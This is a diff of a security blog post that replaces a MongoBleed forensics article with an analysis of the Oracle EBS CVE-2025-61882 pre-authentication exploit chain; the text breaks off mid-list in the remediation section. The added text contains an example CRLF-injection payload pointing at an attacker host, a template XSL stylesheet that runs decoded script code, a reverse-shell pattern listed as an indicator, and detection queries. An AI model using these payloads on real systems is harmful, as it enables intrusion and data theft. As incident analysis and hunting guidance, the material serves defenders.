@@ -1,427 +1,426 @@
 ---
 layout: post
-title: "MongoBleed Forensics"
-subtitle: "What exploitation leaves behind and what it doesn't"
-date: 2025-12-29
-header_image: /assets/images/CVE-2025-14847.png
+title: "Oracle's Really Bad October: The CVE-2025-61882 Story"
+subtitle: "The Zero-Day That Reminded Everyone Why ERP Means 'Everyone's Really Pwned"
+date: 2025-12-31
+header_image: /assets/images/cve2025-61882.png
 ---
 
-CVE-2025-14847, better known as MongoBleed, is a memory disclosure vulnerability in MongoDB's zlib compression handling that lets unauthenticated attackers pull uninitialized heap memory straight out of the server. It's conceptually simple, trivial to exploit, and annoying to investigate. A proof-of-concept dropped on Christmas Day 2025, courtesy of Joe Desimone.
+## The Vulnerability That Ruined Everyone's October
 
-### The Vulnerability
+In early October 2025, Oracle EBS administrators had their weekend plans thoroughly destroyed when reports surfaced that Cl0p ransomware operators were sending extortion emails claiming they'd siphoned data from Oracle E-Business Suite deployments. The kicker? They'd been doing it since at least August, burning a zero-day that nobody knew existed.
 
-MongoBleed exploits MongoDB's network transport compression layer through maliciously crafted compressed payloads that cause the server to miscalculate decompressed data length. The bug lives in how MongoDB handles zlib-compressed network messages.
+CVE-2025-61882 is what you get when you chain five separate weaknesses together into one beautiful pre-authentication remote code execution nightmare. With a CVSS score of 9.8, this isn't just critical on paper it was weaponized in the wild before patches existed, which means threat actors had a two-month head start on defenders.
 
-Here's the simplified view of what's happening:
+The vulnerability sits in Oracle EBS's BI Publisher Integration component, part of the Concurrent Processing module. In plain terms: if you're running Oracle EBS to manage your financials, HR, procurement, or basically any critical business function, this flaw let attackers walk in without credentials and execute arbitrary code. Full system compromise. No username required.
 
-```python
-# Conceptual representation of the vulnerable code path
-def decompress_message(compressed_data, claimed_size):
-    buffer = allocate(claimed_size)  # Allocate based on attacker's claim
-    actual_size = zlib.decompress(compressed_data, buffer)
-    # Bug: returns buffer.length() instead of actual_size
-    return buffer  # Contains uninitialized memory beyond actual_size
+**Timeline Guidance:**
+
+Evidence suggests exploitation began around August 9, 2025, but Mandiant observed suspicious activity potentially dating back to July 10, 2025.
+
+## Affected Versions and Patch Status
+
+**Affected Versions:**
+- Oracle E-Business Suite 12.2.3 through 12.2.14
+
+Oracle released an emergency Security Alert on October 4, 2025, but there's a catch, you need the October 2023 Critical Patch Update installed as a prerequisite before you can even apply the CVE-2025-61882 fix. If you're running an unsupported version (anything outside Premier or Extended Support), Oracle won't help you. You're on your own.
+
+As of this writing, patches are available through Oracle Support (Doc ID 3106344.1), but only if you're under a valid support contract. If you're still running ancient, unsupported EBS versions in production, this vulnerability is probably the least of your problems, but it's definitely exploitable on those systems too.
+
+CISA added CVE-2025-61882 to their Known Exploited Vulnerabilities catalog on October 6, 2025, with confirmed links to ransomware campaigns. Translation: patch now, or expect company visits from people who definitely aren't offering technical support.
+
+## Proof of Concept Details
+
+The exploit chain became semi-public on October 3, 2025, one day before Oracle's advisory, when a threat actor group calling itself "Scattered Lapsus$ Hunters" leaked what they claimed was the exploit Cl0p had been using. The file (SHA256: `76b6d36e04e367a2334c445b51e1ecce97e4c614e88dfb4f72b104ca0f31235d`) showed up on Telegram alongside a profanity-laden rant criticizing Cl0p's operational security.
+
+Oracle referenced this exact file hash in their IOC list, which is about as close as enterprise vendors get to saying "yeah, that's the one."
+
+Multiple security research teams, including watchTowr, CrowdStrike, Mandiant, and VulnCheck; independently verified the exploit chain. It works. It's stable. And based on internet scanning at the time, roughly 5,000+ Oracle EBS login pages were exposed to the public internet when the advisory dropped.
+
+The exploit requires no user interaction and works remotely over HTTP. Once successful, attackers gain code execution in the context of the Oracle EBS application server process, which typically has access to everything that matters in your ERP environment.
+
+## Exploitation Analysis: A Symphony of Bad Decisions
+
+CVE-2025-61882 isn't a single bug. It's an exploit chain that strings together at least five distinct vulnerabilities, demonstrating that whoever found this knew Oracle EBS internals disturbingly well. Let's walk through how this mess actually works.
+
+### Stage 1: Server-Side Request Forgery (SSRF)
+
+The entry point is `/OA_HTML/configurator/UiServlet`, which processes XML documents via the `getUiType` parameter when `redirectFromJsp` is set. The servlet extracts a `return_url` value from the XML and makes an outbound HTTP POST request to that URL.
+
+The vulnerable code lives in `oracle.apps.cz.servlet.UiServlet` and looks like this in simplified form:
+
+```java
+String returnUrl = XmlUtil.getReturnUrlParameter(xmlDocument);
+clientAdapter.setReturnUrl(returnUrl);
+// ... later ...
+CZURLConnection connection = new CZURLConnection(returnUrl);
+connection.connect();
 ```
 
-The attack works like this:
+No validation. No allowlist. Just "here's a URL from an unauthenticated XML document, let's fetch it." Classic SSRF.
 
-1. Attacker sends a compressed message with an inflated `uncompressedSize` field
-2. MongoDB allocates a buffer based on that claim
-3. zlib decompresses the actual data, which only fills the start of the buffer
-4. MongoDB treats the entire buffer as valid data
-5. BSON parsing reads past the legitimate data into uninitialized heap memory
-6. Server sends the whole thing back to the attacker
+### Stage 2: CRLF Injection for Header Control
 
-The heap is whatever was there before. Previous database operations, credentials, session tokens, internal states, anything that happened to occupy that memory region. You don't get to choose what you extract. You get what the heap gives you.
+The SSRF alone wouldn't be enough, but the `return_url` field accepts HTML-encoded control characters, specifically carriage return (`&#13;`) and line feed (`&#10;`). This lets attackers inject arbitrary HTTP headers into the SSRF request.
 
-### Affected Versions and Patch Status
+By crafting a payload with CRLF sequences, attackers can split the HTTP request, inject custom headers, and even transform the request from GET to POST. This is critical because many internal Oracle EBS endpoints expect POST requests with specific headers and session cookies.
 
-This hits a wide range of MongoDB versions:
+Example payload structure:
+```xml
+<param name="return_url">http://apps.example.com:7201/target&#13;&#10;Host: attacker-server&#13;&#10;Cookie: JSESSIONID=...&#13;&#10;&#13;&#10;POST /</param>
+```
 
-**Vulnerable:**
-- 8.2.0 through 8.2.2, 8.0.0 through 8.0.16, 7.0.0 through 7.0.27, 6.0.0 through 6.0.26, 5.0.0 through 5.0.31, 4.4.0 through 4.4.29 & All versions of 4.2, 4.0, and 3.6
+### Stage 3: HTTP Keep-Alive Abuse
 
-End-of-life versions (3.6, 4.0, 4.2) aren't getting patches. If you're running those, the exposure is permanent. Upgrade or accept the risk.
+The exploit chain keeps the TCP connection alive by appending `POST /` at the end of the injected headers. This is clever, it prevents the connection from closing prematurely, allowing the attacker to maintain control long enough for the next stage's XSL transformation to complete.
 
-### Proof-of-Concept Details
+Without this, the exploit fails because the XSL document can't be downloaded and parsed in time. It's a small detail that makes the difference between "interesting bug" and "working RCE."
 
-The original PoC is available at [joe-desimone/mongobleed](https://github.com/joe-desimone/mongobleed) on GitHub. It includes a Docker Compose setup for testing against vulnerable instances, which is convenient for understanding the attack mechanics without wrecking production systems.
+### Stage 4: Authentication Bypass via Path Traversal
 
-The exploit establishes rapid connections (thousands per minute) and probes for memory leaks at various offsets. Each connection attempts to extract heap fragments by sending malformed compressed messages and parsing whatever comes back.
+Oracle EBS runs an internal HTTP service bound to port `7201/TCP` on a private interface (not localhost, usually bound to the host's internal IP). This service hosts the core application logic and includes authentication filters that block unauthenticated access to sensitive JSP files and servlets.
 
-Example output from a successful exploitation run:
+The bypass? Path traversal using `../` sequences. By targeting `/OA_HTML/help/../target.jsp`, attackers can access endpoints that would normally require authentication. The `/help/` path is whitelisted, and the `../` traversal circumvents the filter logic.
 
+How do attackers know the internal IP? Oracle EBS helpfully includes it in `/etc/hosts`:
+```
+172.31.28.161   apps.example.com    apps
+```
+
+So the SSRF targets `http://apps.example.com:7201/OA_HTML/help/../ieshostedsurvey.jsp` and the hostname resolves internally.
+
+### Stage 5: Malicious XSL Transformation (XSLT) for RCE
+
+The target JSP file `ieshostedsurvey.jsp` contains the smoking gun. It builds a URL from the incoming `Host` header and uses it to fetch an XSL stylesheet:
+
+```java
+StringBuffer urlbuf = new StringBuffer();
+urlbuf.append("http://");
+urlbuf.append(request.getServerName());  // Attacker-controlled
+urlbuf.append(":").append(request.getServerPort());
+String xslURL = urlbuf.toString() + "/ieshostedsurvey.xsl";
+URL stylesheetURL = new URL(xslURL);
+XSLStylesheet sheet = new XSLStylesheet(stylesheetURL);
+XSLProcessor xslt = new XSLProcessor();
+xslt.processXSL(sheet, xmlDoc, ...);
+```
+
+By injecting their own hostname via the `Host` header (through CRLF injection), attackers force the server to download an XSL file from their infrastructure. Since Java's XSLT processor can invoke extension functions, this allows arbitrary code execution.
+
+Example malicious XSL:
+```xml
+<xsl:stylesheet version="1.0"
+                xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
+                xmlns:b64="http://www.oracle.com/XSL/Transform/java/sun.misc.BASE64Decoder"
+                xmlns:jsm="http://www.oracle.com/XSL/Transform/java/javax.script.ScriptEngineManager">
+    <xsl:template match="/">
+        <xsl:variable name="bs" select="b64:decodeBuffer(b64:new(),'[base64_payload]')"/>
+        <xsl:variable name="js" select="str:new($bs)"/>
+        <xsl:variable name="m" select="jsm:new()"/>
+        <xsl:variable name="e" select="jsm:getEngineByName($m, 'js')"/>
+        <xsl:variable name="code" select="eng:eval($e, $js)"/>
+    </xsl:template>
+</xsl:stylesheet>
+```
+
+From here, attackers have code execution on the EBS server. Game over.
+
+### The Post-Exploitation Malware Nobody Saw Coming
+
+Once attackers achieved RCE via CVE-2025-61882, they didn't just drop generic webshells or Cobalt Strike beacons. Instead, they deployed custom, multi-stage fileless malware specifically engineered for Oracle WebLogic and EBS environments. Google Threat Intelligence and Mandiant documented two distinct payload chains used in the wild:
+
+Here's how the attack path actually unfolds in production:
+
+**Initial Template Deployment:**
+
+After exploiting the RCE chain, attackers use the following endpoints to upload malicious BI Publisher templates:
+
+```
+GET /OA_HTML/OA.jsp?page=/oracle/apps/xdo/oa/template/webui/TemplateCopyPG
+POST /OA_HTML/OA.jsp?page=/oracle/apps/xdo/oa/template/webui/TemplateCopyPG
+GET /OA_HTML/OA.jsp?page=/oracle/apps/xdo/oa/template/webui/TemplateFileAddPG
+```
+
+**Template Activation:**
+
+The malicious templates are then triggered via the preview functionality:
+
+```
+POST /OA_HTML/OA.jsp?page=/oracle/apps/xdo/oa/template/webui/TemplatePreviewPG
+```
+
+When a template is "previewed," Oracle EBS renders it using XSLT processing. Since the templates contain Base64-encoded Java code embedded in XSL, the rendering process executes that code in the context of the WebLogic server process. No new processes. No file drops. Just legitimate application behavior doing illegitimate things.
+
+**Template Type 1: GOLDVEIN.JAVA (The Downloader)**
+
+The first template variant operates as a downloader. Here's the execution flow:
+
+1. The template obtains the execution context of the current Oracle WebLogic server, ensuring code runs inside the existing process rather than spawning children
+2. It retrieves the HTTP response object to send arbitrary data back to the attacker
+3. The malware beacons to a hardcoded C2 IP address using a fake "TLSv3.1" handshake string (TLS 3.1 doesn't exist, this is misdirection to confuse network monitoring) appended with a randomly generated number
+4. It reads binary data from C2 into a buffer, decrypts it using a rolling XOR key, and loads it as a Java class via reflection
+5. The decrypted class is then invoked, executing second-stage payloads entirely in memory
+6. Finally, it returns an HTML response to the original HTTP request indicating exploitation status
+
+This is GOLDVEIN.JAVA, a Java port of the PowerShell-based GOLDVEIN malware first observed in December 2024 during suspected FIN11 attacks against Cleo file transfer software. The network traffic mimicking TLS but using a non-existent protocol version is a clever evasion tactic.
+
+**Template Type 2: SAGE Infection Chain (The Persistent Backdoor)**
+
+The second payload family is even more sophisticated. It's a nested, multi-stage chain where each component loads the next entirely in memory:
+
+**SAGEGIFT (Reflective Loader):**
+
+The template attempts to load a class called `com.fasterxml.jackson.pb.FileUtils`. This isn't a real Jackson library class, it's malware disguised with a legitimate-sounding name. If the class doesn't exist, it loads it from embedded Base64 data within the template.
+
+**SAGELEAF (In-Memory Dropper - FileUtils.class):**
+
+Once loaded, the `FileUtils` class performs the actual filter injection:
+
+- It contains hardcoded Base64 data representing `Log4jConfigQpgsuaFilter.class` (another fake class name designed to blend in)
+- The malware enumerates all servlet contexts in the WebLogic server using `getContextsByMbean`, `getContextsByThreads`, and `getContext` methods
+- For each context, it creates a new Filter instance and injects it, registering for REQUEST, FORWARD, INCLUDE, and ERROR dispatch types
+- The embedded Base64 is decoded and decompressed using Gzip
+- The resulting `Log4jConfigQpgsubFilter` class is loaded and registered to monitor requests to `/support/*`
+
+**SAGEWAVE (Malicious Servlet Filter - Log4jConfigQpgsubFilter.class):**
+
+This is the persistence mechanism and command execution backdoor. The filter monitors incoming HTTP requests for a specific trigger:
+
+**Trigger Conditions:**
+- HTTP Method: POST
+- URI: `/help/state/content/destination./navId.1/navvSetId.iHelp/`
+
+When these conditions match, the filter:
+
+1. Extracts the POST body containing an encrypted payload
+2. Decrypts it using a hardcoded AES key and IV
+3. Loads the decrypted bytes as a Java class in memory
+4. Executes the class, providing arbitrary code execution
+5. Returns success/failure indicators in the HTTP response
+
+This creates a persistent backdoor where attackers can send encrypted Java payloads to a specific endpoint and have them execute on-demand without touching disk. The filter remains active across application restarts as long as the malicious template exists in the database.
+
+The decryption function includes both AES decryption and Base64 decoding, with proper error handling to avoid crashes that might alert defenders. Google Threat Intelligence noted code overlaps between the final SAGEWAVE payloads and GOLDTOMB, a backdoor previously attributed to FIN11.
+
+**SAGEWAVE Variations**
+
+Mandiant reports that over variations of of the SAGE infection Java payload would listended for a hard-coded HTTP header; X-ORACLE-DMS-ECID, prior to allowing the paylod to be processed. This variant was also observed filtering for different HTTP paths, to include:
+
+```
+/support/state/content/destination./navId.1/navvSetId.iHelp/
+```
+
+The final payload delivered via SAGEWAVE has code overlaps with GOLDTOMB, a backdoor previously attributed to FIN11. However, Mandiant wasn't able to capture the ultimate payload in their incident response engagements, suggesting the attackers were careful about when and where they deployed it.
+
+What makes these malware families particularly nasty is their fileless nature. They reside in memory or database structures, not on the filesystem. EDR tools looking for suspicious processes or file modifications won't see them. The only indicators are unusual database entries and anomalous network connections, both of which are easy to miss in noisy enterprise environments.
+
+**Why This Matters:**
+
+Both template types execute entirely in memory within the existing WebLogic server process. Traditional EDR looking for suspicious process creation won't see anything. File integrity monitoring won't trigger because nothing writes to disk. The only artifacts are database entries that look like legitimate BI Publisher templates and network connections that, unless you're doing deep packet inspection, appear normal.
+
+The SAGE infection chain in particular demonstrates significant Java and Oracle expertise. Enumerating servlet contexts, dynamically injecting filters, and maintaining persistence across application states requires deep understanding of WebLogic internals. This isn't something you copy-paste from GitHub.
+
+## Considerations and Limitations
+
+**Prerequisites:**
+- The target must be running Oracle EBS versions 12.2.3 through 12.2.14
+- The `/OA_HTML/configurator/UiServlet` endpoint must be reachable (typically exposed if EBS is internet-facing)
+- The internal service on port 7201 must be accessible from the application server (it always is in default deployments)
+
+**Limitations:**
+- The exploit requires careful timing and connection management due to the HTTP keep-alive dependency
+- The attacker needs to host their own malicious XSL document on an accessible server
+- Network egress restrictions can break the XSLT callback phase if the EBS server can't reach external infrastructure
+
+**Real-World Impact:**
+- Code execution runs in the context of the EBS application process, which typically has database access and file system permissions
+- Attackers deployed webshells and established persistence via malicious BI Publisher templates stored directly in the Oracle database
+- Post-exploitation tradecraft included using native system utilities (no custom malware needed), making detection harder without application-layer visibility
+
+One noteworthy aspect: whoever originally discovered this chain clearly has deep Oracle EBS expertise. This isn't script kiddie territory. The fact that five separate issues had to be chained together suggests there are likely more bugs lurking in the same codebase.
+
+## Detection and Hunting
+
+If you're reading this and haven't patched yet, here's what you should be looking for in your logs and environment:
+
+**Network-Based Detection:**
+
+Hunt for POST requests to `/OA_HTML/configurator/UiServlet` with the following characteristics:
+- Requests include both `redirectFromJsp=1` and `getUiType` parameters
+- XML payloads containing `return_url` tags with suspicious hostnames or IP addresses
+- Outbound HTTP connections from EBS servers to unexpected destinations
+
+Check web access logs for path traversal attempts:
+- Requests to `/OA_HTML/help/../*.jsp` from external IPs
+- Specifically watch for `/OA_HTML/help/../ieshostedsurvey.jsp`
+
+Monitor for template management activity that could indicate deployment of malicious templates:
+- `GET /POST /OA_HTML/OA.jsp?page=/oracle/apps/xdo/oa/template/webui/TemplateCopyPG`
+- `GET /OA_HTML/OA.jsp?page=/oracle/apps/xdo/oa/template/webui/TemplateFileAddPG`
+- `POST /OA_HTML/OA.jsp?page=/oracle/apps/xdo/oa/template/webui/TemplatePreviewPG`
+
+Watch for the SAGEWAVE backdoor trigger:
+- POST requests to `/support/state/content/destination./navId.1/navvSetId.iHelp`
+- HTTP header `X-ORACLE-DMS-ECID:`
+
+Network beaconing patterns:
+- Outbound connections with fake "TLSv3.1" strings in the handshake (GOLDVEIN.JAVA characteristic)
+- HTTP traffic to C2 infrastructure with randomly appended numbers in the User-Agent or custom headers
+
+**Database-Level Hunting:**
+
+Query the Oracle EBS database for malicious BI Publisher templates. This is where attackers stored both their exploit payloads and the GOLDVEIN/SAGE malware families:
+
+```sql
+SELECT * FROM XDO_TEMPLATES_B 
+WHERE TEMPLATE_CODE LIKE 'TMP%' OR TEMPLATE_CODE LIKE 'DEF%'
+ORDER BY CREATION_DATE DESC;
+
+SELECT * FROM XDO_LOBS 
+ORDER BY CREATION_DATE DESC;
+```
+
+Attackers stored payloads directly in the `XDO_TEMPLATES_B` and `XDO_LOBS` tables. Any templates created with codes starting with `TMP` or `DEF` are suspicious. The actual payload lives in the `LOB_CODE` column.
+
+Look for Base64-encoded Java classes in template data. Specifically search for:
+- References to `com.fasterxml.jackson.pb.FileUtils` (fake class used by SAGELEAF)
+- References to `Log4jConfigQpgsuaFilter` or `Log4jConfigQpgsubFilter` (SAGEWAVE filter)
+- Embedded Gzip-compressed data (used to pack the servlet filter)
+- Large Base64 blobs within XSL templates
+
+Additionally, check for servlet filter deployments that shouldn't exist:
+
+```sql
+SELECT * FROM APPS.FND_CONCURRENT_REQUESTS 
+WHERE ARGUMENT_TEXT LIKE '%java%' OR ARGUMENT_TEXT LIKE '%exec%'
+ORDER BY REQUEST_DATE DESC;
+```
+
+Hunt for templates that reference external network resources:
+```sql
+SELECT * FROM XDO_LOBS 
+WHERE DBMS_LOB.INSTR(LOB_CODE, 'http://') > 0 
+   OR DBMS_LOB.INSTR(LOB_CODE, 'TLSv3.1') > 0;
+```
+
+**Session and Authentication Anomalies:**
+
+Look for suspicious activity in ICX_SESSIONS:
+- UserID 0 (sysadmin) activity from unexpected sources
+- UserID 6 (guest) sessions that shouldn't exist
+- Administrative account logins without corresponding SSO/MFA entries
+
+**Endpoint/Process-Level IOCs:**
+
+Monitor for:
+- Unusual Java process invocations, especially `java -jar` executions by the EBS application account
+- Child processes spawned by the Oracle EBS application server that don't match expected behavior
+- Reverse shell patterns: `/bin/bash -i >& /dev/tcp/<IP>/<PORT>`
+- Outbound network connections from the EBS app server to infrastructure in the Oracle-provided IOC list
+- Suspicious WebLogic servlet filter deployments (SAGEWAVE installs itself as a filter)
+- Java processes with Base64-encoded command-line arguments (SAGEGIFT characteristic)
+- Reconnaissance commands executed from the `applmgr` account (common in observed attacks)
+
+**Memory-Resident Malware Detection:**
+
+The SAGE and GOLDVEIN families are fileless, making them difficult to detect via traditional means. Look for:
+- Unusual in-memory Java class loading activity (check for `defineClass`, `loadClass` invocations in JVM debugging logs)
+- HTTP beacons disguised as TLS handshakes with fake protocol versions (GOLDVEIN.JAVA behavior)
+- Servlet filter installations that weren't deployed through normal application update processes
+- WebLogic server processes with loaded classes containing suspicious names like `FileUtils` in unexpected packages (`com.fasterxml.jackson.pb.*` is not a real Jackson package)
+- Classes with names designed to mimic Log4j components (`Log4jConfigQpgsuaFilter`, `Log4jConfigQpgsubFilter`)
+- XOR-decrypted or AES-decrypted data being loaded as Java classes at runtime
+
+**Java/WebLogic-Specific Hunting:**
+
+Query WebLogic diagnostic logs for filter registrations:
 ```bash
-[*] mongobleed - CVE-2025-14847 MongoDB Memory Leak
-[*] Author: Joe Desimone - x.com/dez_
-[*] Target: 203.0.113.42:27017
-[*] Scanning offsets 20-50000
-
-[+] offset=   117 len=   39: ssions^\u0001�r��*YDr���
-[+] offset= 16582 len= 1552: MemAvailable: 8554792 kB\nBuffers:
-[+] offset= 18731 len= 3908: Recv SyncookiesFailed EmbryonicRsts
-[+] offset= 22104 len=  284: "username":"admin","password":"P@ssw0rd123"
-
-[*] Total leaked: 8748 bytes
-[*] Unique fragments: 42
-[*] Saved to: leaked.bin
+grep -r "addFilter\|registerFilter" $DOMAIN_HOME/servers/*/logs/
+grep -r "FileUtils\|Log4jConfig" $DOMAIN_HOME/servers/*/logs/
 ```
 
-That's 8KB of heap data extracted in seconds. Sometimes you get useful credentials. Sometimes you get kernel statistics. Sometimes you get garbage. The heap doesn't care about your operational needs.
-
-### Exploitation Mechanics
-
-The exploitation process is straightforward but relies on understanding how MongoDB handles compressed network messages.
-
-## Network Transport Layer
-
-MongoDB supports multiple compression algorithms for network traffic: snappy, zlib, and zstd. The vulnerability specifically affects zlib compression. When a client connects and negotiates zlib compression, subsequent messages can trigger the memory disclosure.
-
-## Message Structure
-
-MongoDB wire protocol messages have this structure:
-
-```
-[messageLength][requestID][responseTo][opCode][messageBody]
-```
-
-When compression is enabled, the message body becomes:
-
-```
-[originalOpcode][uncompressedSize][compressorID][compressedMessageBody]
-```
-
-The `uncompressedSize` field is where the attack happens. This is a 32-bit integer that tells MongoDB how much space to allocate for decompression. MongoDB trusts this value.
-
-## The Attack Sequence
-
-1. **Connection establishment**: Attacker connects to MongoDB without authentication
-2. **Compression negotiation**: Declares zlib support in the handshake
-3. **Malicious payload construction**: Creates a compressed message where:
-   - Actual compressed data is small (e.g., 100 bytes)
-   - `uncompressedSize` field claims a much larger size (e.g., 50,000 bytes)
-4. **Memory allocation**: MongoDB allocates 50,000 bytes based on the claim
-5. **Decompression**: zlib decompresses the 100 bytes of actual data into the start of the buffer
-6. **BSON parsing**: MongoDB parses the entire 50,000-byte buffer as BSON data
-7. **Response transmission**: Server sends parsed data back, including uninitialized memory
-
-The BSON parser doesn't validate that the data makes sense. It just reads the buffer and tries to construct valid BSON objects from whatever bytes it finds. When it encounters uninitialized memory, it interprets those random bytes as BSON structures and returns them.
-
-## What Gets Leaked
-
-The leaked data depends entirely on what was previously allocated in that heap region. Common findings include:
-
-- MongoDB internal log fragments
-- WiredTiger storage engine metadata
-- Database credentials from previous authentication attempts
-- Session tokens from active connections
-- API keys from application queries
-- User data from recent database operations
-- Configuration details
-- Internal server state
-
-The key point: **this is not deterministic**. You can't reliably target specific data. You spray and pray, hoping something useful lands in the extracted fragments.
-
-### Considerations and Limitations
-
-## Exploitation Limitations
-
-**No authentication required**: This is pre-auth, which makes it accessible from anywhere the MongoDB port is exposed. If your instance is internet-facing, anyone can attempt exploitation.
-
-**Network access required**: You need direct access to the MongoDB service port (default 27017). This isn't exploitable through a web application unless that application directly exposes MongoDB connection functionality.
-
-**Compression must be enabled**: If zlib compression isn't supported by the server configuration, the attack fails. Servers configured with only snappy or no compression aren't vulnerable.
-
-**Non-deterministic output**: You can't reliably extract specific data on demand. The heap is dynamic. What you get depends on timing, server load, and what operations happened recently.
-
-**High-volume detection signature**: The public PoC generates thousands of connections per minute. This is extremely noisy and easily detected in any environment with connection monitoring.
-
-## Forensic Limitations
-
-Here's where it gets uncomfortable.
-
-**Memory content uncertainty**: Even when you confirm exploitation occurred, you cannot definitively determine what data was exposed. The heap is transient. Memory disclosure vulnerabilities leak unpredictable data. Without complete visibility into heap state at the time of exploitation, you're guessing.
-
-**Log retention gaps**: MongoDB logs rotate. If your retention window is 7-14 days (common in many environments) and the exploitation happened before you detected it, the evidence is gone. Detection scripts can't analyze logs that don't exist.
-
-**Edition-dependent visibility**: MongoDB Community Edition, the version most organizations run, has no audit logging. The default verbosity level is `-1`, which logs only warnings and errors. Even with increased verbosity, you're looking at connection logs, not operation logs. You can see that connections happened. You can't see what those connections did.
-
-**Credential reuse problem**: Attackers can extract credentials via MongoBleed, then use those credentials through normal authenticated channels. The exploitation event is logged (maybe). The subsequent credential abuse looks like legitimate traffic.
-
-This creates a detection/response paradox: you can identify when exploitation attempts occurred, but you cannot prove what data was accessed or what the blast radius actually is.
-
-### Detection, Hunting and Blast assessments
-
-## Behavioral Signatures
-
-The public PoC has a distinctive signature: thousands of connections per minute with no client metadata.
-
-Every legitimate MongoDB driver sends a metadata message (event ID 51800) immediately after connecting. The exploit does not. This creates a reliable behavioral indicator when the public PoC is used.
-
-Detection logic for Community Edition (with verbosity >= 0):
-
-```python
-def detect_mongobleed_exploitation(logs):
-    """Analyze MongoDB logs for exploitation indicators."""
-    by_ip = defaultdict(lambda: {
-        'connections': 0,
-        'metadata_events': 0,
-        'disconnections': 0,
-        'time_window': []
-    })
-    for event in logs:
-        ip = event['remote_ip']
-        
-        if event['id'] == 22943:  # Connection accepted
-            by_ip[ip]['connections'] += 1
-            by_ip[ip]['time_window'].append(event['timestamp'])
-        elif event['id'] == 51800:  # Client metadata
-            by_ip[ip]['metadata_events'] += 1
-        elif event['id'] == 22944:  # Connection closed
-            by_ip[ip]['disconnections'] += 1
-    suspicious = []
-    for ip, metrics in by_ip.items():
-        if metrics['connections'] < 100:
-            continue
-        metadata_rate = metrics['metadata_events'] / metrics['connections']
-        if len(metrics['time_window']) > 1:
-            duration = (max(metrics['time_window']) - 
-                       min(metrics['time_window'])).total_seconds() / 60
-            velocity = metrics['connections'] / max(duration, 0.1)
-        else:
-            velocity = 0
-        if metadata_rate < 0.1 and velocity > 1000:
-            suspicious.append({
-                'ip': ip,
-                'connections': metrics['connections'],
-                'metadata_rate': metadata_rate,
-                'velocity': velocity,
-                'risk': 'HIGH'
-            })
-    return suspicious
-```
-
-Detection output when the public PoC is used:
-
+Check for dynamically loaded classes that don't exist in the application's deployed WARs:
 ```bash
-$ ./mongobleed-detector.sh /var/log/mongodb/
-
-╔══════════════════════════════════════════════════════╗
-║     MongoBleed (CVE-2025-14847) Detection Results   ║
-╚══════════════════════════════════════════════════════╝
-
-[INFO] Processing MongoDB logs...
-[INFO] Analyzed 7 days of logs (2025-12-21 to 2025-12-27)
-[INFO] Total connections analyzed: 142,847
-
-Risk     SourceIP         ConnCount  MetaCount  MetaRate%  BurstRate/m
--------- ---------------- ---------- ---------- ---------- --------------
-HIGH     203.0.113.42     8,234      0          0.0%       112,453
-
-[INFO] Analysis complete
+find $DOMAIN_HOME -name "FileUtils.class" -o -name "Log4j*Filter.class"
 ```
 
-That's a clear indicator when the public exploit is used: zero metadata messages, 112,453 connections per minute. Legitimate applications don't behave like this.
+Monitor WebLogic MBean activity for unexpected servlet filter modifications.
 
-## Log Analysis for Community Edition
+## Remediation and Workarounds
 
-If you're running Community Edition, your forensic options are limited but not zero. Three critical log components exist:
+**Immediate Actions:**
 
-**"NETWORK" events** - Connection and disconnection:
+1. **Apply the patch.** Oracle's October 4, 2025 emergency fix (via Doc ID 3106344.1) is the only real solution. Make sure you have the October 2023 CPU installed first or the patch won't apply.
 
-Example output:
-```
-"{""t"":{""$date"":""2025-12-27T20:53:11.142+00:00""},""s"":""I"",  ""c"":""NETWORK"",  ""id"":22943,   ""ctx"":""listener"",""msg"":""Connection accepted"",""attr"":{""remote"":""203.0.113.42:60696"",""uuid"":{""uuid"":{""$uuid"":""75531bc6-21c8-967b-89ed-5d28e22e72f5""}},""connectionId"":21,""connectionCount"":13}}
-{""t"":{""$date"":""2025-12-27T20:53:11.144+00:00""},""s"":""I"",  ""c"":""NETWORK"",  ""id"":22944,   ""ctx"":""conn21"",""msg"":""Connection ended"",""attr"":{""remote"":""203.0.113.42:60696"",""uuid"":{""uuid"":{""$uuid"":""75531bc6-21c8-967b-89ed-5d28e22e72f5""}},""connectionId"":21,""connectionCount"":10}}"
-"{""t"":{""$date"":""2025-12-27T20:53:21.321+00:00""},""s"":""I"",  ""c"":""NETWORK"",  ""id"":51800,   ""ctx"":""conn24"",""msg"":""client metadata"",""attr"":{""remote"":""203.0.113.42:54188"",""client"":""conn24"",""negotiatedCompressors"":[],""doc"":{""application"":{""name"":""mongodump""},""driver"":{""name"":""mongo-go-driver"",""version"":""1.16.0""},""os"":{""type"":""linux"",""architecture"":""amd64""},""platform"":""go1.21.12""}}}
-```
+2. **Restrict network access.** If you can't patch immediately:
+   - Remove Oracle EBS from direct internet exposure
+   - Place it behind a Web Application Firewall (WAF) with strict rule enforcement
+   - Implement IP allowlisting if external access is required
 
-**"ACCESS" events** - Authentication:
+3. **Disable unnecessary endpoints.** If the `/OA_HTML/configurator/UiServlet` endpoint isn't required for business operations, consider disabling it at the web server level until patching is complete.
 
-Example:
-```
-{""t"":{""$date"":""2025-12-27T20:04:49.119+00:00""},""s"":""I"",  ""c"":""ACCESS"",   ""id"":5486106, ""ctx"":""conn13"",""msg"":""Successfully authenticated"",""attr"":{""client"":""203.0.113.42:40898"",""isSpeculative"":true,""isClusterMember"":false,""mechanism"":""SCRAM-SHA-256"",""user"":""root"",""db"":""database1"",""result"":0,""metrics"":{""conversation_duration"":{""micros"":2213,""summary"":{""0"":{""step"":1,""step_total"":2,""duration_micros"":165},""1"":{""step"":2,""step_total"":2,""duration_micros"":30}}}},""extraInfo"":{}}}
-```
+4. **Block outbound connections.** The exploit requires the EBS server to reach attacker-controlled infrastructure for the XSLT callback. Egress filtering that restricts outbound HTTP/HTTPS to known-good destinations will break the RCE phase (though attackers can still achieve SSRF).
 
-**"COMMAND" events** - Limited based on verbosity but a good hunt if you have an increased verbosity level and want to confirm any potential DB interactions
+**Post-Patch Actions:**
 
-## Detection Tools
+- Hunt for persistence mechanisms. Attackers stored backdoors in the database as malicious templates containing GOLDVEIN.JAVA or the SAGE infection chain (SAGEGIFT → SAGELEAF → SAGEWAVE). Run the database queries mentioned earlier and investigate any suspicious entries created between July and October 2025. Pay special attention to Base64-encoded content in template LOBs, especially those containing fake class names like `FileUtils` or `Log4jConfig*Filter`.
 
-Two primary tools exist for MongoBleed detection:
+- Check for malicious servlet filters. SAGEWAVE operates as a Java servlet filter that monitors HTTP requests. Use WebLogic diagnostic tools to enumerate all registered filters and investigate any that:
